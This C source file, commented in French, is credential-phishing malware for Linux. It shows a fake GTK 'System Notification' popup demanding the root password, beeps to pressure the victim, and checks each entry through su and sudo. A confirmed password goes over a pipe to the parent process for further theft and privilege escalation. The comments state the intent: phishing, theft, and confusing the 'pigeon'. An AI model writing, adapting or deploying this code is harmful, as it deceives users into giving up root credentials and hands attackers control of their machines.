#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <gtk-3.0/gtk/gtk.h>
#include <sys/wait.h>
#include <signal.h>
#include "2_header.h"




//POPUP DE FISHING SI SUCCES ON ENVOI A INDELOGABLE PUIS VOL QUI EN DECOULE
//SINON A RECO ATTAQUE INDELOGABLE VOL
#define GREEN       "\033[32m"
#define YELLOW      "\033[33m"
#define CYAN        "\033[36m"
#define RED         "\033[31m"
#define RESET       "\033[0m"



int popup_root(void)
{

    printf(""YELLOW"Duplication du processus en cours ... "RESET"\n\n");
    fflush(stdout);
    int pipe_fd[2];
    pipe(pipe_fd);
    pid_t pid = fork();


    gboolean timaout_de_secu(gpointer data)
    {
        GtkWidget *popup = GTK_WIDGET(data);
        gtk_widget_destroy(popup);
        exit(4);
        return G_SOURCE_REMOVE;
    }

    int mdp_root_est_il_reel(const char *string_input)
    {
            FILE *canal_communication_sys = popen("su root -c 'exit 0' <&0 2>/dev/null", "w");
            if (canal_communication_sys == NULL)
            {
                return 0;
            }
            fprintf(canal_communication_sys,"%s\n",string_input);
            fflush(canal_communication_sys);
            int return_status = pclose(canal_communication_sys);
            int return_code = WEXITSTATUS(return_status);
            if(return_code == 0)
            {
                printf(""GREEN" Correct R00t password entered !\n"RESET"");
                printf(""YELLOW"We will send it to parent process in a few\n"RESET"");
                
                close(pipe_fd[0]);
                //code d envoi

                return 1;
            }
            canal_communication_sys = popen("sudo -S -k true 2>/dev/null", "w");
            if (canal_communication_sys != NULL)
            {
                fprintf(canal_communication_sys, "%s\n", string_input);
                fflush(canal_communication_sys);
                int return_status = pclose(canal_communication_sys);
                int return_code = WEXITSTATUS(return_status);
                
                if (return_code == 0)
                {
                    printf(GREEN " Correct R00t password entered (via sudo) !\n" RESET);
                    printf(YELLOW "We will send it to parent process in a few\n" RESET);
                    
                    close(pipe_fd[0]);
                    return 1; // Succès sous Parrot OS
                }
            }
          
            return 0;

    }


    void password_enter_is_it_correct(GtkWidget *widget, gpointer data)
    {
        const gchar vide[] = "";
        static int compteur = 3;
        GtkEntry* texte_dans_input = GTK_ENTRY(data);
        const gchar* string_input = gtk_entry_get_text(texte_dans_input);
        printf(""GREEN" USER A ENTRE UN MOT DE PASS YESSSS!\n"RESET"");
        printf(""CYAN" mot de pass root est peut etre :"RESET""RED" %s\n\n"RESET"",string_input);

            if(mdp_root_est_il_reel(string_input) == 1)
            {
                printf(""GREEN" \nConnected As R00T !\n"RESET"");
                printf(""YELLOW"Sending Password to Parent Process...\n\n"RESET"");

                write(pipe_fd[1], string_input, strlen(string_input));
                close(pipe_fd[1]);



                gtk_widget_destroy(gtk_widget_get_toplevel(widget));
                exit(0);
                
            }
            else
            {
                gtk_entry_set_text(texte_dans_input,vide);
                GdkWindow *transfo_en_window_pour_bip = gtk_widget_get_window(widget);
                if (transfo_en_window_pour_bip != NULL) 
                {
                    gdk_window_beep(transfo_en_window_pour_bip);
                }
                compteur --;
                if (compteur == 0)
                {
                    close(pipe_fd[1]);
                    exit(3);
                }
            }
    }


    //code exec par les 2 process
    if (pid == -1)
    {
        printf(""RED"Erreur lors de la duplication du processus"RESET"\n");
        printf("Futur code de privesc autonome\n");

        return 1;
    }
    if (pid == 0)
    {
        //code execute par le child
        close(pipe_fd[0]);

        printf(""CYAN"\nProcessus Enfant : PID = "RESET""RED"%d"RESET"\n",getpid());
        printf(""CYAN"Processus Parent : PID = "RESET""RED"%d"RESET"\n\n",getppid());
        
        //popup dure de vie 3 essai en cas de creds errone puis exit kill
        //va faloir cree un avertissement sonore pour amoindrire capacite de reflexion du pigeon
        GtkWidget* popup;
        gtk_init(0,NULL);

        char str[] = 
            "<span foreground='#ff1111' size='x-large' weight='bold'>⚠️ WARNING !</span>\n"
            "<span foreground='#ff1111' size='x-large' weight='bold'>You need to be <b>root</b> to perform this action.</span>\n"
            "<span foreground='#ff1111' size='x-large' weight='bold'>Enter root password :</span>";
        char enter[] = "<span foreground='#ff1111' size='x-large' weight='bold'>Enter</span>";
        

        GtkWidget* vertical_conteneur = gtk_box_new (GTK_ORIENTATION_VERTICAL,5);
        GtkWidget*  txt_intro_popup = gtk_label_new(str);
        gtk_label_set_xalign(GTK_LABEL(txt_intro_popup),0.0);
        gtk_label_set_markup(GTK_LABEL(txt_intro_popup),str);
        GtkWidget* champ_de_saisie = gtk_entry_new();
        GtkWidget* bouton_du_bas_container = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 0);
        GtkWidget* bouton_du_bas = gtk_button_new();
        GtkWidget* txt_du_btn = gtk_label_new(enter);
        gtk_label_set_markup(GTK_LABEL(txt_du_btn),enter);
        gtk_container_add(GTK_CONTAINER(bouton_du_bas),txt_du_btn);
        gtk_widget_set_margin_end (bouton_du_bas,10);




        gtk_box_pack_start(GTK_BOX(vertical_conteneur),txt_intro_popup, FALSE, FALSE, 2);
        gtk_box_pack_start(GTK_BOX(vertical_conteneur),champ_de_saisie, FALSE, FALSE, 2);
        gtk_box_pack_start(GTK_BOX(vertical_conteneur),bouton_du_bas_container, FALSE, FALSE, 0);
        gtk_widget_set_halign(bouton_du_bas, GTK_ALIGN_END);
        gtk_widget_set_size_request (bouton_du_bas,100,50);
        gtk_box_pack_start(GTK_BOX(vertical_conteneur),bouton_du_bas, FALSE, FALSE,10);
        



        popup = gtk_window_new(GTK_WINDOW_TOPLEVEL);
        gtk_window_set_title(GTK_WINDOW(popup),"System Notification");
        gtk_window_set_default_size(GTK_WINDOW(popup),800,150);
        g_signal_connect(popup,"destroy",G_CALLBACK(gtk_main_quit),NULL);
        g_signal_connect(popup,"destroy",G_CALLBACK(privesc_faille_rec),NULL);
        gtk_container_add(GTK_CONTAINER(popup),vertical_conteneur);

        g_signal_connect(G_OBJECT(bouton_du_bas), "clicked", G_CALLBACK(password_enter_is_it_correct),champ_de_saisie);
        g_signal_connect(G_OBJECT(champ_de_saisie), "activate", G_CALLBACK(password_enter_is_it_correct),champ_de_saisie);


     

        gtk_widget_show_all(popup);

        GdkWindow *transfo_en_window_pour_bip = gtk_widget_get_window(popup);
        gdk_window_beep(transfo_en_window_pour_bip);


        g_timeout_add(60000, (GSourceFunc)timaout_de_secu,popup);
        gtk_main();

        exit(0);

    }
    else
    {
        
        printf(""CYAN"Attente de la fermeture du processus enfant ...\n"RESET"");
        fflush(stdout);
        close(pipe_fd[1]);
        int waiting;
        waitpid(pid, &waiting, 0);
        
        if (WIFEXITED(waiting) && WEXITSTATUS(waiting) == 0)
        {
            char mot_de_pass_root[256] = {0};
            int lecture_et_stockage_du_mdp = read(pipe_fd[0],mot_de_pass_root, sizeof(mot_de_pass_root) - 1);
            if (lecture_et_stockage_du_mdp > 0)
            {
                mot_de_pass_root[lecture_et_stockage_du_mdp] = '\0';
                printf(""CYAN" \nMot De Pass R00t Capture Verifier et Stocke :"RESET""RED" %s\n\n"RESET"",mot_de_pass_root);
                fflush(stdout);
                fonction_destination(mot_de_pass_root);
                close(pipe_fd[0]); // Fermeture propre du tube en lecture
                exit(0);
                
                return 0;
            }
        }
    
        else if (WEXITSTATUS(waiting) == 3)
        {
            printf(RED "\nEchec 3 essai infructueux enregistrés.\n" RESET);
            return 0;
        }
        else if (WEXITSTATUS(waiting) == 4)
        {
            printf(RED "\nEchec Le chrono de 1 minutes c'est écoule sans recu ...\n" RESET);
            return 0;
        }

        //fermeture de la lecture
        close(pipe_fd[0]);
    }
    return 0;
}




